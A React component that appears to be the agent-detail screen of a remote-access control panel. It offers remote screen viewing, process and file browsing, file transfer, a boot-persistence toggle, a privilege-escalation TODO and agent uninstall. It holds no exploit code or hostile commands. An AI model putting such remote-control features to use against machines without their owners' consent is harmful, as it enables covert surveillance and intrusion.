import { useState, useEffect } from 'react'
import { FileTransfer } from './FileTransfer'
import './AgentDetails.css'

export function AgentDetails({ agentId, onBack, onTogglePersistence, onStartScreen, onOpenProcesses, onOpenFiles, onUninstall }) {
  const [persistence, setPersistence] = useState(false)
  const [privilege, setPrivilege] = useState('user') // 'user' | 'admin' | 'system'
  const [isToggling, setIsToggling] = useState(false)

  const handleTogglePersistence = async () => {
    const newState = !persistence
    setIsToggling(true)
    
    const success = await onTogglePersistence(agentId, newState)
    
    if (success) {
      setPersistence(newState)
    }
    
    setIsToggling(false)
  }

  const handleElevate = () => {
    // TODO: Attempt privilege escalation or show instructions
    alert('To get root/admin access:\n\nWindows: Run agent as Administrator\nLinux: Run with sudo or as root\n\nThe agent executes with the privileges of its process.')
  }
  return (
    <div className="agent-details">
      <div className="details-header">
        <button className="back-btn" onClick={onBack}>← Back</button>
        <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
          <h3>Agent: {agentId?.slice(0, 8)}...</h3>
          <span className="status-badge online">Online</span>
        </div>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <button className="secondary-btn" onClick={onOpenProcesses}>⚙ Processes</button>
          <button className="secondary-btn" onClick={onOpenFiles}>📂 Files</button>
          <button className="primary-btn" onClick={onStartScreen}>🖥 View Screen</button>
        </div>
      </div>

      <div className="details-grid">
        <FileTransfer agentId={agentId} />
        
        <div className="detail-card">
          <h4>System Info</h4>
          <div className="detail-row">
            <span>Hostname</span>
            <span>Unknown</span>
          </div>
          <div className="detail-row">
            <span>OS</span>
            <span>Unknown</span>
          </div>
          <div className="detail-row">
            <span>Version</span>
            <span>Unknown</span>
          </div>
        </div>

        <div className="detail-card">
          <h4>Privileges</h4>
          <div className="privilege-indicator">
            <span className={`priv-badge ${privilege}`}>
              {privilege === 'system' ? '🔴 SYSTEM' : privilege === 'admin' ? '🟡 Admin' : '🟢 User'}
            </span>
          </div>
          <p className="detail-note">
            Agent runs with current user privileges. 
            Restart as admin/root for elevated access.
          </p>
          <button className="elevate-btn" onClick={handleElevate}>
            How to Elevate
          </button>
        </div>

        <div className="detail-card">
          <h4>Persistence</h4>
          <div className={`toggle-control ${isToggling ? 'toggling' : ''}`}>
            <span>Auto-start on boot</span>
            <label className="switch">
              <input 
                type="checkbox" 
                checked={persistence}
                onChange={handleTogglePersistence}
                disabled={isToggling}
              />
              <span className="slider"></span>
            </label>
          </div>
          <p className="detail-note">
            {isToggling 
              ? 'Updating...' 
              : persistence 
                ? 'Agent will restart automatically after reboot.' 
                : 'Agent stops when user logs out.'}
          </p>
        </div>

        <div className="detail-card danger">
          <h4>Danger Zone</h4>
          <div className="danger-actions">
            <button 
              className="danger-btn" 
              onClick={() => {
                if (window.confirm('Are you sure you want to PERMANENTLY uninstall this agent?')) {
                  onUninstall(agentId)
                }
              }}
            >
              Uninstall Agent
            </button>
            <button className="danger-btn" disabled>
              Kill Process
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}
